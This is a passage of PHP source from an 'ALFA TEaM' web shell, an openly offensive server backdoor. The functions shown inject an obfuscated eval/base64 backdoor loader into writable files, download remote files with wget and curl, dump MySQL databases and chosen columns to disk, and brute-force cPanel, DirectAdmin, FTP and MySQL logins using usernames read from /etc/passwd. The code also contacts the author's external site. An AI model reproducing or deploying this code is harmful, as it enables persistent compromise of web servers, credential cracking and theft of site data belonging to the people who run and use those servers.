array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
'td2' =>
array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
'td3' =>
array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
'td4' =>
array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
'td5' =>
array('color' => 'FFFFFF', 'tdName' => 'Backdoor Loader: ', 'inputName' => 'file', 'inputValue' => $cwd, 'inputSize' => '50', 'placeholder' => true),
'td6' =>
array('color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'alfa', 'inputSize' => '50')
);
create_table($table);
echo("<p>{$select}</p>");
echo($textarea);
echo("<p><input type='submit' value=' '></p></form></p></center>");
if($_POST['alfa2']!=''&&$_POST['alfa3']!=''&&$_POST['alfa5']!=''&&$_POST['alfa6']!=''){
$dbhost = $_POST['alfa2'];
$dbuser = $_POST['alfa3'];
$dbpw = $_POST['alfa4'];
$dbname = $_POST['alfa5'];
$file = $_POST['alfa6'];
$method = $_POST['alfa7'];
$shell = $_POST['alfa8'];
$key = str_replace(array('"','\''),'',trim($_POST['alfa9']));
if($key=='')$key='alfa';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__ALFA_SHELL_CODE'];}
if($conn = mysqli_connect($dbhost,$dbuser,$dbpw,$dbname)){
$code = '<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$key.'"){$conn=mysqli_connect("'.str_replace('"','\"',$dbhost).'","'.str_replace('"','\"',$dbuser).'","'.str_replace('"','\"',$dbpw).'","'.str_replace('"','\"',$dbname).'");$q=mysqli_query($conn,"SELECT `code` FROM alfa_bc LIMIT 0,1");$r=mysqli_fetch_assoc($q);$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x($r["code"]);exit;}?>';
if(@is_file($file)&&@is_writable($file)){
@mysqli_query($conn,'DROP TABLE `alfa_bc`');
@mysqli_query($conn,'CREATE TABLE `alfa_bc` (code LONGTEXT)');
@mysqli_query($conn,'INSERT INTO `alfa_bc` VALUES("'.$shell.'")');
@file_put_contents($file,$code."\n".@file_get_contents($file));
__alert($success."<br>Run With: ".basename($file)."?alfa=".$key.'</font>');}else{__alert($error);}}}}
echo('</div>');
alfafooter();
}
function alfawhois(){
echo("<div class='header'><center><p><div class='txtfont_header'>| Whois |</div></p><p><form onsubmit=\"g('whois',null,this.url.value,'>>');return false;\"><div class='txtfont'>Url: </div> <input type='text' name='url' style='text-align:center;' size='50' placeholder='google.com'> <input type='submit' value=' '></form></p></center>");
if($_POST['alfa2']=='>>'&&!empty($_POST['alfa1'])){
$site = str_replace(array('http://','https://','www.','ftp://'),'',$_POST['alfa1']);
$target = 'http://api.whoapi.com/?apikey=093b6cb9e6ea724e101928647df3e009&r=whois&domain='.$site;
$data = @file_get_contents($target);
if($data==''){$get = new AlfaCURL();$get->ssl = true;$data = $get->Send($target);}
$target = @json_decode($data,true);
echo __pre();
if(is_array($target)){echo($target["whois_raw"]);}else{echo alfaEx("whois ".$site);}}
echo("</div>");
}
function alfaremotedl(){
alfahead();
echo("<div class='header'><center><p><div class='txtfont_header'>| Upload From Url |</div></p><p>
<form onsubmit=\"g('remotedl',null,this.d.value,this.p.value,'>>');return false;\">
<p><div class='txtfont'>Url: </div>&nbsp;&nbsp;&nbsp;<input type='text' name='d' size='50'></p>
<div class='txtfont'>Path:</div> <input type='text' name='p' size='50' value='".$GLOBALS['cwd']."'><p><input type='submit' value=' '></p>
</form></p></center>");
if(isset($_POST['alfa1'],$_POST['alfa2'],$_POST['alfa3'])&&!empty($_POST['alfa1'])&&$_POST['alfa3']=='>>'){
echo __pre();
$url = $_POST['alfa1'];
$path = $_POST['alfa2'];
echo('<center>');
if(__download($url,$path)){
echo('<font color="green">Success...!</font>');
}else{
echo('<font color="red">Error...!</font>');
}
echo('</center>');
}
echo("</div>");
alfafooter();
}
function __download($url,$path=false){
if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
$saveas = basename(rawurldecode($url));
if($path){$saveas=$path.$saveas;}
if($content = __read_file($url)){
if(@is_file($saveas))@unlink($saveas);
if(__write_file($saveas, $content)){return true;}}
$buff = alfaEx("wget ".$url." -O ".$saveas);
if(@is_file($saveas)) return true;
$buff = alfaEx("curl ".$url." -o ".$saveas);
if(@is_file($saveas)) return true;
$buff = alfaEx("lwp-download ".$url." ".$saveas);
if(@is_file($saveas)) return true;
$buff = alfaEx("lynx -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = alfaEx("GET ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = alfaEx("links -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = alfaEx("fetch -o ".$saveas." -p ".$url);
if(@is_file($saveas)) return true;
return false;
}
function clean_string($string){
  if(function_exists("iconv")){
	  $s = trim($string);
	  $s = iconv("UTF-8", "UTF-8//IGNORE", $s);
  }
  return $s;
}
function __read_file($file, $boom = true){
$content = false;
if($fh = @fopen($file, "rb")){
$content = "";
while(!feof($fh)){
$content .= $boom ? clean_string(fread($fh, 8192)) : fread($fh, 8192);
}
@fclose($fh);
}
if(empty($content)||!$content){
	$content = alfaEx("cat '".addslashes($file)."'");
}
return $content;
}
function alfaMarket(){
echo "<div class='header'>";
$curl = new AlfaCURL();
$content = $curl->Send("http://solevisible.com/market.php");
$data = @json_decode($content, true);
if(!empty($data)){
if($data["status"] == "open"){
	echo $data["content"];
}else{
	echo $data["error_msg"];
}
}else{
	echo "<div style='text-align:center;font-size:20px;'>Cant connect to the alfa market....! try later.</div>";
}
echo "</div>";
}
function alfaSettings(){
alfahead();
AlfaNum(6,7,8,9,10);
echo '<div class=header><center><p><div class="txtfont_header">| Settings |</div></p><h3><a href=javascript:void(0) onclick="g(\'settings\',null,null,null,null,null,null,null,null,\'main\')">| Generall Setting | </a></h3></center>';
if($_POST["alfa8"] == "main"){
echo '<p><center><div class="txtfont_header">| Settings |</div></p><form onSubmit="reloadSetting(this);return false;" method=\'post\'>';
$lg_array = array('0'=>'No','1'=>'Yes');
$penc_array = array('false'=>'No','true'=>'Yes');
$protect_html = "";
$icon_html = "";
$postEnc_html = "";
$login_html = "";
$cgiapi_html = "";
foreach($lg_array as $key=>$val)$protect_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['safemode']=='1'?'selected':'').'>'.$val.'</option>';
foreach($lg_array as $key=>$val)$icon_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['show_icons']=='1'?'selected':'').'>'.$val.'</option>';
foreach($penc_array as $key=>$val)$cgiapi_html .= '<option value="'.$key.'" '.(!empty($_POST['alfa9'])&&$_POST['alfa9']==$key?"selected":($GLOBALS["DB_NAME"]["cgi_api"]&&empty($_POST['alfa9'])?'selected':'')).'>'.$val.'</option>';
foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['alfa7'])&&$_POST['alfa7']==$key?"selected":(__ALFA_POST_ENCRYPTION__&&empty($_POST['alfa7'])?'selected':'')).'>'.$val.'</option>';
$lg_array = array("gui"=>"GUI","500"=>"500 Internal Server Error","403"=>"403 Forbidden","404"=>"404 NotFound");
foreach($lg_array as $key=>$val)$login_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['login_page']==$key?'selected':'').'>'.$val.'</option>';echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['alfa5']=='>>'){
echo __pre();
if(!empty($_POST['alfa3'])){
$protect = $_POST['alfa1'];
$lgpage = $_POST['alfa2'];
$username = $_POST['alfa3'];
$password = md5($_POST['alfa4']);
$icon = $_POST['alfa6'];
$post_encrypt = $_POST['alfa7'];
$cgi_api_val = $_POST['alfa9'];
@chdir($GLOBALS['home_cwd']);
$basename = @basename($_SERVER['PHP_SELF']);
$data = @file_get_contents($basename);
$user_rand = $GLOBALS["DB_NAME"]["user_rand"];
$pass_rand = $GLOBALS["DB_NAME"]["pass_rand"];
$login_page_rand = $GLOBALS["DB_NAME"]["login_page_rand"];
$safemode_rand = $GLOBALS["DB_NAME"]["safemode_rand"];
$show_icons_rand = $GLOBALS["DB_NAME"]["show_icons_rand"];
$post_encryption_rand = $GLOBALS["DB_NAME"]["post_encryption_rand"];
$cgi_api_rand = $GLOBALS["DB_NAME"]["cgi_api_rand"];
$find_user = '/\''.$user_rand.'\'(.*?),/i';
$find_pw = '/\''.$pass_rand.'\'(.*?),/i';
$find_lg = '/\''.$login_page_rand.'\'(.*?),/i';
$find_p = '/\''.$safemode_rand.'\'(.*?),/i';
$icons = '/\''.$show_icons_rand.'\'(.*?),/i';
$postEnc = '/\''.$post_encryption_rand.'\'(.*?),/i';
$cgi_api_reg = '/\''.$cgi_api_rand.'\'(.*?),/i';
if(!empty($username)&&preg_match($find_user,$data,$e)){
$new = '\''.$user_rand.'\' => \''.$username.'\',';
$data = str_replace($e[0],$new,$data);
}
if(!empty($_POST['alfa4'])&&preg_match($find_pw,$data,$e)){
$new = '\''.$pass_rand.'\' => \''.$password.'\',';
$data = str_replace($e[0],$new,$data);
}
if(!empty($lgpage)&&preg_match($find_lg,$data,$e)){
$new = '\''.$login_page_rand.'\' => \''.$lgpage.'\',';
$data = str_replace($e[0],$new,$data);
}
if(!empty($find_p)&&preg_match($find_p,$data,$e)){
$new = '\''.$safemode_rand.'\' => \''.$protect.'\',';
$data = str_replace($e[0],$new,$data);
}
if(preg_match($icons,$data,$e)){
$new = '\''.$show_icons_rand.'\' => \''.$icon.'\',';
$data = str_replace($e[0],$new,$data);
}
if(preg_match($postEnc,$data,$e)){
$new = '\''.$post_encryption_rand.'\' => '.$post_encrypt.',';
$data = str_replace($e[0],$new,$data);
}
if(preg_match($cgi_api_reg,$data,$e)){
$new = '\''.$cgi_api_rand.'\' => '.$cgi_api_val.',';
$data = str_replace($e[0],$new,$data);
}
if(@file_put_contents($basename,$data)){
echo '<b>UserName: </b><font color="green"><b>'.$username.'</b></font><br /><b>Password: </b><font color="green"><b>'.$_POST['alfa4'].'</b></font><script>post_encryption_mode = '.$post_encrypt.';</script>';
}else{
__alert("<span style='color:red;'>File has no edit access...!</span>");
}
}else{
__alert("<span style='color:red;'>UserName is Empty !</span>");
}
}
}elseif($_POST["alfa8"] == "color"){
echo('<center><p><div class="txtfont_header">| Custom Color |</div></p><form onSubmit="reloadColors();return false;" method=\'post\'>');
echo '<table border="1"><tbody>';
$template = '<tr><td style="text-align:center;"><a href="http://solevisible.com/customcolors/{help}.png" target="_blank"><font color="#00FF00">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#ffffff" value="{color}"></td></tr>';
$x = 1;
foreach($GLOBALS['__ALFA_COLOR__'] as $key => $value){
	$multi = "";
	if(is_array($value)){
		if(isset($value["multi_selector"])){
			$multi = __ZW5jb2Rlcg(json_encode($value));
		}
	}
	$value = alfa_getColor($key);
	$help = strtolower(str_replace(array(":", "+"), array("_", "_plus"), $key));
	echo str_replace(array("{index}", "{target}", "{color}", "{multi}", "{help}"), array($x++, $key, $value, $multi, $help), $template);
}
echo '<tr><td style="text-align:center;">-</td><td style="text-align:center;"><div class="tbltxt">*</div></td><td><div style="margin-left:5px;" class="tbltxt">Use Default Color:</div></td><td></td><td><center><input type="checkbox" id="use_default_color" value="1"></center></td></tr>';

echo '</tbody></table><p><input type="submit" name="btn" value=" "></p></form><p><button style="padding:4px;;margin-right:20px;" onclick="$(\'importFileBtn\').click();" class="button"> Import </button> <button style="padding:4px;margin-left:20px;" onclick="g(\'settings\',null,null,null,null,null,null,null,\'export\',\'color\')" class="button"> Export </button></center></p>';
if($_POST['alfa7']=='export'){
	echo __pre();
	$colors = is_array($GLOBALS["DB_NAME"]["color"])?$GLOBALS["DB_NAME"]["color"]:array();
	$glob_colors = $GLOBALS["__ALFA_COLOR__"];
	$array = array();
	foreach($glob_colors as $k => $v){
		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
			$v = trim($colors[$k]);
		}else{
			$v = trim(is_array($v)?$v["key_color"]:$v);
		}
		$array[$k] = $v;
	}
	$file = "alfa_color_config_".date('Y-m-d-h_i_s').".conf";
	$config = json_encode($array, JSON_PRETTY_PRINT);
	if(!@file_put_contents($file, $config)){
		echo('<p><center>Color Config:<br><br><textarea rows="12" cols="70" type="text">'.$config.'</textarea></center></p>');
	}else{
		echo('<h3><p><center><a class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$file.'\', \'download\')"><font color="#0F0">Download Config</font></a></center></p></h3>');
	}
}
if($_POST['alfa2']=='>>'){
	echo __pre();
	$colors = json_decode($_POST["alfa1"],true);
	$array = "";
	$is_default = isset($_POST["alfa3"])&&$_POST["alfa3"]=="1"?true:false;
	$glob_colors = $GLOBALS["__ALFA_COLOR__"];
	foreach($glob_colors as $k => $v){
		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
			$v = trim($colors[$k]);
		}else{
			$v = trim(is_array($v)?$v["key_color"]:$v);
		}
		$array .= '"'.trim($k).'" => "'.$v.'",';
	}
	@chdir($GLOBALS['home_cwd']);
	$basename = @basename($_SERVER['PHP_SELF']);
	$data = @file_get_contents($basename);
	$color = '/\'color\'(.*?)\),/s';
	if(preg_match($color,$data,$e)){
		$new = "'color' => array(".$array."),";
		$data = str_replace($e[0],$new,$data);
		if(@file_put_contents($basename, $data)){
			echo("<center><p><h3>[+] Success...</h3></p></center><script>location.reload();</script>");
		}else{
			echo("<center><p><h3>[-] We Not have permission to Edit shell...!</h3></p></center>");
		}
	}else{
		echo("<center><p><h3>[-] Error...!</h3></p></center>");
	}
}
}
echo('</div>');
alfafooter();
}
function alfaaboutus(){
alfahead();
echo '<div class="header">';
$news = new AlfaCURL();
$about_us = $news->Send("http://solevisible.com/aboutus.php");
if(empty($about_us)){
$about_us = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ PEACE~&#9774;</font><br><b>
<font color='#00A220'>Shell Coded By Sole Sad & Invisible (ALFA TEaM)</font><br>
<font color='#00A220'>Contact : solevisible@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @solevisible</font><br>
<font color='#FFFFFF'>Skype : ehsan.invisible</font><br>
<font color='#FFFFFF'>Skype : sole.sad</font><br>
<font color='#FF0000'>Persian Gulf For Ever</font><br>
<font color='#FF0000'>Iranian Programmers</font><br>
<font color='#FF0000'>############</font><br>
</center></pre><iframe src='tg://resolve?domain=solevisible' frameborder='0' width='0' height='0'></iframe>";
}
echo __pre().$about_us;
echo('</div>');
alfafooter();
}
function alfacoldumper(){
alfahead();
echo('<div class="header">');
AlfaNum(8,9,10);
echo "<center><br><div class='txtfont_header'>| Mysql Column Dumper |</div><br><br>".getConfigHtml('all')."<form method='post' onsubmit=\"var opt_id=this.getAttribute('opt_id');var delimiter='json';try{if($('dumper-delimiter-type').value == 'delimiter')delimiter=$('dumper-delimiter-input').value}catch(e){};g('coldumper',null,delimiter,JSON.stringify(col_dumper_selected_data[opt_id]),this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); col_dumper_selected_data[opt_id] = {};return false;\"><p>";
$delimiter = (!empty($_POST['alfa1']) ? $_POST['alfa1'] : '::');
$selected_data = json_decode($_POST['alfa2'], true);
$username = ($_POST['alfa3']);
$password = ($_POST['alfa4']);
$dbname = ($_POST['alfa5']);
$dfile = ($_POST['alfa6']);
$host = ($_POST['alfa7']);
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => $host, 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => $username, 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => $password, 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => $dbname, 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Output Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']), 'inputSize' => '50')
);
create_table($table);
echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
$db = false;
if(!empty($dbname)){
	$db = @mysqli_connect($host, $username, $password, $dbname);
}
if(count($selected_data) > 0){
	if($db){
		if(!is_dir($dfile)){
			$dfile = $GLOBALS['cwd'];
		}
		$tbls = "";
		$ext = '.txt';
		if($delimiter == 'json'){
			$ext = '.json';
		}
		foreach ($selected_data as $tbl => $cols) {
			$tables_query = mysqli_query($db, "SELECT ".implode(',', $cols)." FROM $tbl");
			$file_name = $dfile.'/'.$dbname.'.'.$tbl.$ext;
			$fp = fopen($file_name, "w");
			$data = array();
			while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
				if($delimiter == "json"){
					$col_arr = array();
					foreach ($row as $key => $value) {
						if(empty($value)){
							$value = "[empty]";
						}
						 $col_arr[$key] = $value;
					}
					$data[$tbl][] = $col_arr;
				}else{
					$data = "";
					foreach ($row as $key => $value) {
						if(empty($value)){
							$value = "[empty]";
						}
						$data .= $value . $delimiter;
					}
					fwrite($fp, $data ."\n");
				}
			}
			if($delimiter == "json"){
				fwrite($fp, json_encode($data));
			}
			fclose($fp);
			$tbls .= "Done ~~~> ".$file_name."<br>";
		}
		echo __pre();
		echo "<center><font color='#00FF00'>".$tbls."</font></center>";
	}
}
if(!empty($dbname) && count($selected_data) == 0){
//echo __pre();
if($db){
	echo("<hr><div style='text-align:center;margin-bottom:5px;font-weight:bolder;'><span>[ Select your tables and columns for dumping data ]</span></div>");
	echo("<div style='text-align:center;'><span>Output Type: </span><select id='dumper-delimiter-type' onchange='colDumplerSelectType(this);' name='output_type'><option value='delimiter' selected>delimiter</option><option value='json'>json</option></select><div id='coldumper-delimiter-input' style='display:inline;'><span> Delimiter: </span><input id='dumper-delimiter-input' style='text-align:center;' type='text' name='delimiter' placeholder='eg: ,'></div></div>");
	$data = array();
	$tables_query = mysqli_query($db, "SELECT table_name FROM information_schema.tables WHERE table_schema = database();");
	while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
		$data[$row["table_name"]] = array();
		$table_count_q = mysqli_query($db, "SELECT count(*) FROM `".$row['table_name']."`");
		$table_count = mysqli_fetch_row($table_count_q);
		$data[$row["table_name"]]["data_count"] = $table_count[0];
		$columns_query = mysqli_query($db, "SELECT column_name FROM information_schema.columns WHERE table_name = '".$row['table_name']."'");
		while($row2 = mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
			$data[$row["table_name"]]["cols"][] = $row2["column_name"];
		}
	}
	mysqli_close($db);

	echo '<ul id="myUL">';
	foreach($data as $tbl => $cols){
	    echo '<li><span style="color:#00FF00;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
	    foreach($cols["cols"] as $col){
	        echo '<li tbl="'.$tbl.'"><span style="color:#00FF00;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
	    }
	    echo '</ul></li>';
	}
	echo '</ul>';
}else{
echo('<center>mysqli_connect : Error!</center>');
}
}
echo('</div>');
alfafooter();
}
function alfaDumper(){
alfahead();
echo('<div class="header">');
AlfaNum(8,9,10);
echo "<center><br><div class='txtfont_header'>| Mysql Database Dumper |</div><br><br>".getConfigHtml('all')."<form method='post' onsubmit=\"g('dumper',null,null,null,this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); return false;\"><p>";
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' =>'50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Dump Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']).'alfa.sql', 'inputSize' => '50')
);
create_table($table);
echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
$username = ($_POST['alfa3']);
$password = ($_POST['alfa4']);
$dbname = ($_POST['alfa5']);
$dfile = ($_POST['alfa6']);
$host = ($_POST['alfa7']);
if(!empty($dbname)){
echo __pre();
$msg = "<center>Check this :  <font color='red'>".$dfile."</font></center>";
if(@mysqli_connect($host,$username,$password,$dbname)){
if(strlen(alfaEx("mysqldump"))>0){
alfaEx("mysqldump --single-transaction --host=\"$host\" --user=\"$username\" --password=\"$password\" $dbname > '".addslashes($dfile)."'");
echo($msg);
}else{
__alert("Error...!");
}
}else{
echo('<center>mysqli_connect : Error!</center>');
}
}
echo('</div>');
alfafooter();
}
function Alfa_DirectAdmin_Cracker($info){
if(!$info['mysql'])
$url = $info['protocol'].$info['target'].':'.$info['port'].'/CMD_LOGIN';
else $url = $info['protocol'].$info['target'].'/phpmyadmin';
$curl = curl_init();
curl_setopt($curl, CURLOPT_FOLLOWLOCATION,1);
curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($curl, CURLOPT_HEADER,0);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_URL,$url);
curl_setopt($curl, CURLOPT_USERPWD, $info['username'].':'.$info['password']);
if($info['mysql'])curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
$result = @curl_exec($curl);
$curl_errno = curl_errno($curl);
$curl_error = curl_error($curl);
if ($curl_errno > 0) {echo "<font color='red'>Error: $curl_error</font><br>";}
elseif(preg_match('/CMD_FILE_MANAGER|frameset/i',$result)){
echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
$info['target'] = $url;
CrackerResualt($info);
}
curl_close($curl);
}
function Alfa_CP_Cracker($info){
$url = $info['protocol'].$info['target'].':'.$info['port'];
$curl = curl_init();
curl_setopt($curl, CURLOPT_FOLLOWLOCATION,1);
curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($curl, CURLOPT_HEADER,0);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl, CURLOPT_HTTPHEADER, array("Authorization: Basic " . __ZW5jb2Rlcg($info['username'].":".$info['password']) . "\n\r"));
curl_setopt($curl, CURLOPT_URL, $url);
$result = @curl_exec($curl);
$curl_errno = curl_errno($curl);
$curl_error = curl_error($curl);
if ($curl_errno > 0) {echo "<font color='red'>Error: $curl_error</font><br>";}
elseif(preg_match('/filemanager/i',$result)){
echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
$info['target'] = $url;
CrackerResualt($info);
}
curl_close($curl);
}
function Alfa_FTP_Cracker($info){
$url = $info['protocol'].$info['target'];
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_USERPWD, "".$info['username'].":".$info['password']."");
$result = @curl_exec($curl);
$curl_errno = curl_errno($curl);
$curl_error = curl_error($curl);
if ($curl_errno > 0) {echo "<font color='red'>Error: $curl_error</font><br>";}
elseif(preg_match('/(\d+):(\d+)/i',$result)){
echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
$info['target'] = $url;
CrackerResualt($info);
}
curl_close($curl);
}
function Alfa_Mysql_Cracker($info){
if(@mysqli_connect($info['target'].':'.$info['port'],$info['username'],$info['password'])){
CrackerResualt($info);
echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
}
}
function Alfa_FTPC($info){
if($con=@ftp_connect($info['target'],$info['port'])){
if($con){
$login=@ftp_login($con,$info['username'],$info['password']);
if($login){CrackerResualt($info);}}}
@ftp_close($con);
}
function CrackerResualt($info){
$res = $info['target'].' => '.$info['username'].":".$info['password']."\n" ;
$c = @fopen($info['fcrack'],'a+');
@fwrite($c, $res);
@fclose($c);
}
function Alfa_Call_Function_Cracker($method,$info){
switch($method){case 'cp':return Alfa_CP_Cracker($info);break;case 'direct': case 'phpmyadmin':return Alfa_DirectAdmin_Cracker($info);break;case 'ftp':return Alfa_FTP_Cracker($info);break;case 'mysql':return Alfa_Mysql_Cracker($info);break;case 'mysql':return Alfa_FTPC($info);break;}
}
function alfaCrackers(){
alfahead();
AlfaNum(9,10);
echo '<div class="header"><center><br><div class="txtfont_header">| Brute Forcer |</div><br><br><form method="post" onsubmit="g(\'Crackers\',null,this.target.value,this.port.value,this.usernames.value,this.passwords.value,this.fcrack.value,\'start\',this.protocol.value,this.loginpanel.value);return false;"><div class="txtfont">Login Page: <select onclick="dis_input(this.value);" name="loginpanel">';
foreach(array('cp'=>'Cpanel','direct'=>'DirectAdmin','ftp'=>'FTP','phpmyadmin'=>'PhpMyAdmin[DirectAdmin]','mysql'=>'mysql_connect()','ftpc'=>'ftp_connect()') as $key=>$val)echo('<option value="'.$key.'">'.$val.'</option>');
echo '</select> Protocol: <select id="protocol" name="protocol">';
foreach(array('https://','http://','ftp://') as $val)echo('<option value="'.$val.'">'.$val.'</option>');
echo '</select> Website/ip Address: <input id="target" type="text" name="target" value="localhost">
Port: <input id="port" type="text" name="port" value="2083">
<table width="30%"><td align="center">Users List</td><td align="center">Passwords</td></table>
<textarea placeholder="Users" rows="20" cols="25" name="usernames">'.($GLOBALS['sys']=='unix'?alfaEx("cut -d: -f1 /etc/passwd"):"").'</textarea>
&nbsp <textarea placeholder="Passwords" rows="20" cols="25" name="passwords"></textarea><br><br>
Save Result Into File <input type="text" name="fcrack" value="cracked.txt">
<p><input type="submit" name="cracking" value=" " /></div></form></p><center>';
$target = str_replace(array('https://','http://','ftp://'),'',$_POST['alfa1']);
$port = $_POST['alfa2'];
$usernames= $_POST['alfa3'];
$passwords = $_POST['alfa4'];
$fcrack = $_POST['alfa5'];
$cracking = $_POST['alfa6'];
$protocol = $_POST['alfa7'];
$loginpanel = $_POST['alfa8'];
$p = $loginpanel == 'phpmyadmin' ? $p = true : false;
if($cracking=='start'){
echo __pre();
$exuser = explode("\n",$usernames);
$expw = explode("\n",$passwords);
foreach($exuser as $user){
foreach($expw as $pw){
